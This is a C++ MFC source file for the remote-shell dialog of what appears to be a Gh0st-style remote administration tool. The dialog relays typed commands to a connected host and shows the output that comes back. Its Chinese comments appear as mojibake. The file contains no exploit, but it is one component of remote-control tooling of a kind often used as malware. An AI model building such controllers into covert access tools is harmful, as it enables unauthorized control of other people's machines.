// ShellDlg.cpp : ʵ���ļ�
//

#include "stdafx.h"
#include "Remote.h"
#include "ShellDlg.h"
#include "afxdialogex.h"
#include "Common.h"


// CShellDlg �Ի���

IMPLEMENT_DYNAMIC(CShellDlg, CDialog)

CShellDlg::CShellDlg(CWnd* pParent, CIOCPServer* pIOCPServer, ClientContext *pContext)
	: CDialog(CShellDlg::IDD, pParent)
{

	m_iocpServer	= pIOCPServer;
	m_pContext		= pContext;
	m_nCurSel = 0;
	m_hIcon			= LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_CMDSHELL));   //�ӱ����̵ľ����õ�IDI_CMDSHELL
}

CShellDlg::~CShellDlg()
{
}

void CShellDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_EDIT, m_edit);
}


BEGIN_MESSAGE_MAP(CShellDlg, CDialog)
	ON_WM_CLOSE()
	ON_WM_SIZE()
	ON_EN_CHANGE(IDC_EDIT, &CShellDlg::OnEnChangeEdit)
	ON_WM_CTLCOLOR()
END_MESSAGE_MAP()


// CShellDlg ��Ϣ�������


void CShellDlg::OnClose()
{
	// TODO: �ڴ������Ϣ�����������/�����Ĭ��ֵ
	m_pContext->m_Dialog[0] = 0;
	closesocket(m_pContext->m_Socket);	   //�ر�����뱻�ض˽���Զ���ն˵�Socket  ���ض˵�WorkThread �̻߳���ܵ��ر��׽��ֵ���Ӧ
	CDialog::OnClose();
}


void CShellDlg::OnSize(UINT nType, int cx, int cy)    //Dlg ���ԷŴ���С
{
	CDialog::OnSize(nType, cx, cy);
	ResizeEdit();

	// TODO: �ڴ˴������Ϣ����������
}


void CShellDlg::ResizeEdit(void)
{
	if (m_edit.m_hWnd==NULL)
	{
		return;
	}
	RECT	rectClient;
	RECT	rectEdit;
	GetClientRect(&rectClient);
	rectEdit.left = 0;
	rectEdit.top = 0;
	rectEdit.right = rectClient.right;
	rectEdit.bottom = rectClient.bottom;
	m_edit.MoveWindow(&rectEdit);
}

BOOL CShellDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	//�õ���ǰ���ڵ����ݴ�С  ��ʼ��ʱ���ֵӦ��Ϊ0
	m_nCurSel = m_edit.GetWindowTextLength();

	//�õ����ض˵�IP����ʾ�����ڵı�����
	CString str;
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	BOOL bResult = getpeername(m_pContext->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
	str.Format("\\\\%s - Զ���ն�", bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "");
	SetWindowText(str);

	m_edit.SetLimitText(MAXDWORD); // ������󳤶�

	// ֪ͨԶ�̿��ƶ˶Ի����Ѿ���
	BYTE bToken = COMMAND_NEXT;
	m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));   

	return TRUE;  

}


void CShellDlg::OnEnChangeEdit()
{
	int len = m_edit.GetWindowTextLength();
	if (len < m_nCurSel)
	{
		m_nCurSel = len;
	}
}


HBRUSH CShellDlg::OnCtlColor(CDC* pDC, CWnd* pWnd, UINT nCtlColor)
{
	HBRUSH hbr = CDialog::OnCtlColor(pDC, pWnd, nCtlColor);

	// TODO:  �ڴ˸��� DC ���κ�����
	if ((pWnd->GetDlgCtrlID() == IDC_EDIT) && (nCtlColor == CTLCOLOR_EDIT))
	{
		COLORREF clr = RGB(255, 255, 255);
		pDC->SetTextColor(clr);   //���ð�ɫ���ı�
		clr = RGB(0,0,0);
		pDC->SetBkColor(clr);     //���ú�ɫ�ı���
		return CreateSolidBrush(clr);  //��ΪԼ�������ر���ɫ��Ӧ��ˢ�Ӿ��
	}
	else
	{
		return CDialog::OnCtlColor(pDC, pWnd, nCtlColor);
	}
	return hbr;
}


void CShellDlg::OnReceiveComplete(void)
{
	AddKeyBoardData();
	m_nReceiveLength = m_edit.GetWindowTextLength();
}



void CShellDlg::AddKeyBoardData(void)
{
	// �������0
	m_pContext->m_DeCompressionBuffer.Write((LPBYTE)"", 1);           //�ӱ����ƶ�������������Ҫ����һ��\0
	CString strResult = (char*)m_pContext->m_DeCompressionBuffer.GetBuffer(0);    //������е����� ���� \0

	//�滻��ԭ���Ļ��з�  ����cmd �Ļ���ͬw32�µı༭�ؼ��Ļ��з���һ��   ���еĻس�����   
//	strResult.Replace("\n", "\r\n");
	
	//�õ���ǰ���ڵ��ַ�����
	int	len = m_edit.GetWindowTextLength();   //0
	
	//����궨λ����λ�ò�ѡ��ָ���������ַ�  Ҳ����ĩβ ��Ϊ�ӱ��ض��������� Ҫ��ʾ�� ���ǵ� ��ǰ���ݵĺ���
	m_edit.SetSel(len, len);
	
	//�ô��ݹ����������滻����λ�õ��ַ�    //��ʾ
	m_edit.ReplaceSel(strResult);
	
	//���µõ��ַ��Ĵ�С
	m_nCurSel = m_edit.GetWindowTextLength();
	
	//����ע�⵽��������ʹ��Զ���ն�ʱ �����͵�ÿһ�������� ����һ�����з�  ����һ���س�
	//Ҫ�ҵ�����س��Ĵ������Ǿ�Ҫ��PreTranslateMessage�����Ķ���  
}



BOOL CShellDlg::PreTranslateMessage(MSG* pMsg)
{

	// TODO: �ڴ����ר�ô����/����û���
	//����Ǽ��̰���
	if (pMsg->message == WM_KEYDOWN)
	{
		// ����VK_ESCAPE��VK_DELETE
		if (pMsg->wParam == VK_ESCAPE || pMsg->wParam == VK_DELETE)
			return true;
		//����ǿɱ༭��Ļس���
		if (pMsg->wParam == VK_RETURN && pMsg->hwnd == m_edit.m_hWnd)
		{
			//�õ����ڵ����ݴ�С
			int	len = m_edit.GetWindowTextLength();
			CString str;
			//�õ����ڵ��ַ�����
			m_edit.GetWindowText(str);
			//���뻻�з�
			str += "\r\n";
			//�õ������Ļ��������׵�ַ�ټ���ԭ�е��ַ���λ�ã���ʵ�����û���ǰ�����������
			//Ȼ�����ݷ��ͳ�ȥ������������������������������
			m_iocpServer->Send(m_pContext, (LPBYTE)str.GetBuffer(0) + m_nCurSel, str.GetLength() - m_nCurSel);  //
			m_nCurSel = m_edit.GetWindowTextLength();  //���¶�λm_nCurSel
		}
		// ����VK_BACK
		if (pMsg->wParam == VK_BACK && pMsg->hwnd == m_edit.m_hWnd)
		{
			if (m_edit.GetWindowTextLength() <= m_nReceiveLength)
				return true;
		}
	}
	// Ctrlû����
	if (pMsg->message == WM_CHAR && GetKeyState(VK_CONTROL) >= 0)
	{
		int	len = m_edit.GetWindowTextLength();
		m_edit.SetSel(len, len);
		// �û�ɾ���˲������ݣ��ı�m_nCurSel
		if (len < m_nCurSel)
			m_nCurSel = len;
	}   //


	return CDialog::PreTranslateMessage(pMsg);
}
